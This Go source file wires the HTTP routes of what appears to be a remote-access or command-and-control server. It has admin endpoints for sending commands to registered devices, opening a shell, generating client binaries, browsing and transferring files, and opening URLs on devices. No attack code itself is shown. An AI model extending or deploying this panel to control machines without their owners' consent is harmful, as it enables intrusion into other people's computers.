package http

import (
	"github.com/gin-gonic/gin"
	"github.com/sirupsen/logrus"
	"github.com/youtrolledhahaha/XDTROLLEDAxzxxinternal/environment"
	"github.com/youtrolledhahaha/XDTROLLEDAxzxxinternal/middleware"
	"github.com/youtrolledhahaha/XDTROLLEDAxzxxservices/auth"
	"github.com/youtrolledhahaha/XDTROLLEDAxzxxservices/client"
	"github.com/youtrolledhahaha/XDTROLLEDAxzxxservices/device"
	"github.com/youtrolledhahaha/XDTROLLEDAxzxxservices/url"
	"github.com/youtrolledhahaha/XDTROLLEDAxzxxservices/user"
)

type httpController struct {
	Configuration  *environment.Configuration
	Logger         *logrus.Logger
	AuthMiddleware *middleware.JWT
	ClientService  client.Service
	AuthService    auth.Service
	UserService    user.Service
	DeviceService  device.Service
	UrlService     url.Service
}

func NewController(
	configuration *environment.Configuration,
	router *gin.Engine,
	log *logrus.Logger,
	authMiddleware *middleware.JWT,
	clientService client.Service,
	systemService auth.Service,
	userService user.Service,
	deviceService device.Service,
	urlService url.Service,
) {
	handler := &httpController{
		Configuration:  configuration,
		AuthMiddleware: authMiddleware,
		Logger:         log,
		ClientService:  clientService,
		AuthService:    systemService,
		UserService:    userService,
		DeviceService:  deviceService,
		UrlService:     urlService,
	}

	router.NoRoute(handler.noRouteHandler)
	router.GET("/health", handler.healthHandler)
	router.GET("/login", handler.loginHandler)
	router.POST("/auth", authMiddleware.LoginHandler)

	adminGroup := router.Group("")
	adminGroup.Use(authMiddleware.MiddlewareFunc())
	adminGroup.Use(authMiddleware.AuthAdmin) //require admin role token

	authGroup := router.Group("")
	authGroup.Use(authMiddleware.MiddlewareFunc())
	{
		adminGroup.GET("/", handler.getDevicesHandler)

		router.GET("/logout", authMiddleware.LogoutHandler)

		adminGroup.GET("/settings", handler.getSettingsHandler)
		adminGroup.GET("/settings/refresh-token", handler.refreshTokenHandler)

		adminGroup.GET("/profile", handler.getUserProfileHandler)
		adminGroup.POST("/user", handler.createUserHandler)
		adminGroup.PUT("/user/password", handler.updateUserPasswordHandler)

		authGroup.POST("/device", handler.setDeviceHandler)
		adminGroup.GET("/devices", handler.getDevicesHandler)

		authGroup.GET("/client", handler.clientHandler)
		adminGroup.POST("/command", handler.sendCommandHandler)

		adminGroup.GET("/shell", handler.shellHandler)

		adminGroup.GET("/generate", handler.generateBinaryGetHandler)
		adminGroup.POST("/generate", handler.generateBinaryPostHandler)

		adminGroup.GET("/explorer", handler.fileExplorerHandler)

		authGroup.GET("/download/:filename", handler.downloadFileHandler)
		authGroup.POST("/upload", handler.uploadFileHandler)

		adminGroup.POST("/open-url", handler.openUrlHandler)
	}
}
